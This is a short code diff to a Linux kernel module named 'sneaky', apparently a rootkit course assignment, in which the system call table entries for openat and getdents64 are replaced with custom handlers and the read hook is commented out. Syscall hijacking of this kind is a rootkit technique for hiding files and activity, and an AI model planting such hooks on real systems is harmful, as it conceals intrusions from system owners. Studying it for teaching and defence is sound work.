@@ -173,7 +173,7 @@ static int initialize_sneaky_module(void)
   
   sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
   sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;
-  sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;
+  // sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;
 
   // You need to replace other system calls you need to hack here
   
